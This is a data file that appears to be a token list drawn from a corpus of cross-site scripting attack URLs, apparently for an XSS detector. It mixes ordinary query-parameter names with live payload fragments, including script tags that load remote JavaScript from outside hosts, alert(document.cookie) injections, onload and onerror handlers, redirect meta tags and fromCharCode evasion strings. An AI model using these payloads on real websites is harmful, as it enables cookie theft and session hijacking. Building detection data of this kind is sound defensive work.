,tokens
192,"0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0)"
193,<<script>
194,http://cyber
195,cyber-unity
196,content=
197,'the_miller'
198,output=
199,0=
200,'0ssi0_tr'
201,source=
202,cal=
203,username=
204,/xssed_by_omeha/);</script><script>alert(document.cookie
205,msg=
206,hl=
207,<noscript>
208,file=
209,'drakula'
210,<link href=http://starext.by.ru/css.css type=text/css rel=stylesheet>
211,go=
212,method=
213,"""kusomiso.com"""
214,"<"""
215,searchtxt=
216,'i-landet'
217,client=
218,<script src=http://ha.ckers.org/xss.js>
219,qt=
220,item=
221,<plaintext>
222,style=
223,cmd=
224,mod=
225,'seymen'
226,filter=
227,v=
228,term=
229,<title>
230,"""xssbydt"""
231,redirect=
232,<script src=http://ckers.org/s>
233,<body onload=alert('xss')>
234,/kabus/
235,'airroxssed'
236,illes
237,http:
238,num=
239,order=
240,<script >
241,"<meta http-equiv=""refresh"" content=""0;url=http://www.canixim.com"">"
242,<script src=http://ha.ckers.org/s.js>
243,state=
244,uid=
245,https:
246,wcheadlines=
247,kelime=
248,"""resistance"""
249,cof=
250,forid:
251,template=
252,http://jersain
253,path=
254,/securitylab.ir/
255,"<img src=""http://www.cibernautica.com/forocibernautica/upload/norehemzu0.gif"">"
256,sa=
257,domain=
258,catid=
259,u=
260,</head>
261,charset=
262,frame=
263,user=
264,lr=
265,city=
266,as_nickname=
267,as_pcia_id=
268,'cueballr'
269,mid=
270,</img>
271,btng=
272,baslik=
273,'0ssi0-xht'
274,oe=
275,proxystylesheet=
276,target=
277,<body/onload=alert(/xss/)>
278,'s0m.ph'
279,section=
280,searchword=
281,bad=
282,innerhtml=
283,<script src=http://sinek.pandela.net/j.js>
284,tipo=
285,op=
286,newsearch=
287,day=
288,"""cyber_thief(turkey"
289,<a
290,i=
291,retid=
292,/pyske/
293,<script src=http://lupbot.comule.com/asu_abangjs.php>
294,dest=
295,http://starext
296,f=
297,"""daimon"""
298,link=
299,'kabus-kabustr.com'
300,locale=
301,kt=
302,'killer-tr'
303,searchtext=
304,http://r0t
305,url(
306,"<script/src=""http://tmp.vgood.com.tw/poc.js"">"
307,'=xssbydt='
308,color:
309,stype=
310,vid=
311,code=
312,contentid=
313,fl=
314,"0,0,0,0,0,0,0,0,0,0)"
315,<'<<script>
316,<'>
317,http://kabustr
318,</noscript>
319,"<img """""">"
320,zip=
321,m_name=
322,count=
323,titulo=
324,<iframe src=/>
325,categoryid=
326,/kabus-kabustr.com/
327,mail=
328,document.cookie);</script><script>alert(/kabus/
329,"0,0,0,0,0,0,0,0,0,0,0,0))//--></script>"">'><script>alert(string.fromcharcode(0,0,0,0,0,0,0,0,0,0,0,0)"
330,topic=
331,<x
332,"""starext"""
333,<iframe src=http://www.google.com>
334,sortby=
335,"""x-turk"""
336,send=
337,<body onload=alert('kusomiso.com')>
338,prefix=
339,to=
340,"""iblaze"""
341,kw=
342,date=
343,height=
344,"<body onload=""alert(0)"">"
345,initial=
346,e=
347,cy=
348,<font%20size=0>
349,<div%20align=center>
350,<textarea%20name=0%20cols=0%20rows=0%20id=0>
351,zoneid=
352,http://data
353,pg=
354,<style>
355,where=
356,blog=
357,orderby=
358,<body onload=alert(/xss/)>
359,bigclassname=
360,"""xssedbycicosz"""
361,rpt=
362,"0)</script></textarea><script>alert(""kaksii_was_here"")<script>alert('kaksii_was_here');alert(0)</script>""</html><html><script>alert(0"
363,0);</script>&short_url=<script>alert(0
364,sp=
365,<body>
366,<script src=http://www.fileden.com/files/0/0/0/0/xss.gif>
367,"""jock0r"""
368,"""cyber//for-ferda"""
369,select=
370,<script src=http://iblog.ir/style.js>
371,xss:
372,</html>
373,<script src=http://ha.ckers.org/xss.js?/>
374,"""x"""
375,"""i-landet"""
376,"<img src=""http://img0.imageshack.us/img0/0/logonj0.gif"">"
377,format=
378,subject=
379,base=
380,"<script src=""http://googlebig.com/l.js"">"
381,offset=
382,width=
383,"<iframe src=""http://www.xssed.com"">"
384,cat_id=
385,"<img src=""http://img0.imageshack.us/img0/0/xssks0.jpg"">"
386,smallclassname=
387,<img src=foo.png onerror=alert(/xss/) />
388,startrec=
389,http://nullflow
390,tld=
391,"<imgsrc=""http://img0.imageshack.us/img0/0/0vrul0.jpg"">"
392,letter=
393,word=
394,<script language=javascript>
395,</xss/*-*/style=xss:e/**/xpression(alert('=xssbydt='))>
396,search_word=
397,"""cyber//ferda-forever"""
398,message=
399,tid=
400,ct=
401,";"""
402,level=
403,ss=
404,menu=
405,http://ha
406,/=xssbydt=/
407,/xssed_by_omeha/
408,'agd_scorp'
409,"0,0,0,0,0))//';alert(string.fromcharcode(0,0,0,0,0))//"";alert(string.fromcharcode(0,0,0,0,0))//"";alert(string.fromcharcode(0,0,0,0,0))//--></script>"">'><script>alert(string.fromcharcode(0,0,0,0,0)"
410,width:
411,"<<img """""">"
412,"""skyr0x"""
413,"<body onload=alert(""starext"")>"
414,/totalschaden/
415,<scriptsrc=http://byccc.awardspace.com/js/xssccc.js>
416,alt=
417,</script
418,<bodyonload=alert(0)>
419,"""totalschaden"""
420,pt=
421,<img
422,group=
423,navdirection=
424,maxtrm=
425,trmcols=
426,addtermo=
427,indexkey=
428,<strong>
429,show=
430,onload=
431,"<metahttp-equiv=""refresh"" content=""0;url=http://www.canixim.com"">"
432,</body>
433,<script src=http://byccc.awardspace.com/js/xssccc.js>
434,</>
435,/xssed_by_nemesis/);alert(document.cookie
436,lng=
437,tab=
438,<meta
439,author=
440,foo=
441,'nullflow'
442,http://lotion
443,hid=
444,token=
445,/xss/.source));</script>}</style><script>a=eval;b=alert;a(b(/xss/.source)
446,channel=
447,catalogid=
448,g=
449,sub=
450,<font color=red>
451,/killer-tr/
452,goto=
453,cs=
454,age=
455,viewtype=
456,pageid=
457,ps=
458,lg=
459,http://insecurity
460,server=
461,val=
462,left:
463,pagina=
464,/noph0bia/
465,col=
466,refid=
467,newsid=
468,3ealert(
469,http://lht
470,file:
471,</b>
472,ad=
473,loc=
474,list=
475,/xssed!/
476,ce=
477,"""scriptorium(turkey"
478,height:
479,cbopagesize=
480,pagenum=
481,d:
482,date:
483,top:
484,product=
485,seller=
486,button=
487,bbs=
488,"<iframesrc=""http://xssed.com"">"
489,siteid=
490,ctry=
491,error=
492,navigator.useragent
493,field=
494,'0'
495,restrict=
496,qu=
497,phpsessid=
498,"<""'>"
499,langid=
500,'narcoticxs'
501,visibility:
502,"<font size=""0"">"
503,idp=
504,eval(
505,dir=
506,sec=
507,/scr0m/
508,desc=
509,max=
510,h=
511,value=
512,opt=
513,sc=
514,position:
515,nav=
516,ac=
517,commit=
518,picture=
519,<script src=http://mygot.0mb.com/lol.js>
520,display=
521,<font size=0>
522,gender=
523,data:
524,seller_name=
525,max_cur=
526,image:
527,"0,0"
528,find=
529,searchbutton=
530,binding:
531,/nemessis-www.rstzone.org/
532,ara=
533,filename=
534,pageno=
535,<<body onload=prompt(document.domain)>
536,search:
537,config=
538,es=
539,cb=
540,"0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0)"
541,c0=
542,str=
543,</strong>
544,0__cb=
545,0__zoneid=
546,0__bannerid=
547,ch=
548,<iframe src=http://www.google.com/>
549,cc=
550,eid=
551,collection=
552,m0=
553,brand=
554,<html>
555,q0=
556,req=
557,texto=
558,'by-panzerturk'
559,status=
560,searchid=
561,</p>
562,http://ad
563,pub=
564,nome=
565,badlink=
566,zone=
567,'cyber//www.warattack.org'
568,l:
569,rows=
570,layout=
571,sm=
572,area=
573,lc=
574,z=
575,question_box=
576,cisofield0=
577,<script src=http://droptix.viralcoders.com/xss.js>
578,ver=
579,/ccc/
580,news_id=
581,tb=
582,ok=
583,href=
584,search_query=
585,region=
586,version=
587,scale=
588,querytext=
589,phase=
590,do=
591,search_string=
592,busca=
593,sitesearch=
594,freesearch=
595,_pagelabel=
596,sv=
597,menuid=
598,<img src=0.gif onerror=alert(0)>
599,command=
600,scope=
601,company=
602,http://uploaders
603,channelid=
604,kno=
605,body=
606,onlyonehitbypage=
607,fr=
608,cisoroot=
609,location.search.substring(
610,redir=
611,"0,0).concat(document.domain"
612,media=
613,getfields=
614,expression(
615,link:
616,address=
617,size=
618,phone=
619,sorttype=
620,http://seymen
621,form_id=
622,sn=
623,referer=
624,topsecure.net
625,hari(
626,<input>
627,searchfor=
628,eventid=
629,qsrc=
630,bql=
631,site:
632,a_id=
633,pxy_t=
634,add_c=
635,la=
636,</td>
637,ud=
638,entqr=
639,hitsperpage=
640,siteurl=
641,cx=
642,srid=
643,onmousemove=
644,lat=
645,pgt=
646,se=
647,trackquery=
648,hideresetbtn=
649,severity=
650,hidedetails=
651,ip=
652,sort_by=
653,qc=
654,cisobox0=
655,ql=
656,fm=
657,<b>
658,cat0=
659,nh=
660,font:
661,toolbar=
662,foo:
663,field0=
664,domains=
665,<textarea name=0 cols=0 rows=0 id=0>
666,<div align=center>
667,index:
668,"<div style=""position: absolute;left: 0px;top: 0px;​​z-index: 0;visibility: visible; color: white; font-size: 0px;"">"
669,background:
670,query0=
671,pn=
672,p0=
673,<br/>
674,countryid=
675,s:
676,<font color='white'>
677,forid=
678,value_0=
679,<br />
680,sn0=
681,addr=
682,t:
683,vlc:
684,galt:
685,ah:
686,div:
687,alc:
688,gfnt:
689,gimp:
690,gl:
691,lc:
692,bgc:
693,lbgc:
694,subcategoryid=
695,icao_id=
696,"<image path=""img/rotation/bandeau_rotation0.jpg"" />"
697,a0=
698,stat0=
699,zbirka0=
700,types=
701,kwd0=
702,fcaption0=
703,platform0=
704,collection:
705,categoryids=
706,contenttypes=
707,rub0=
708,"<img src=http://www.thisiteisntsite.com? onerror=alert(string.fromcharcode(0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0))>"
709,oper_0=
710,errorc_checkout_date_invalid=
711,spk_prod0=
712,spk_ser0=
713,errorc_checkin_date_invalid=
714,newsletters=
715,e0:
716,manufacture=
717,price_range=
718,0categoryid=
719,None
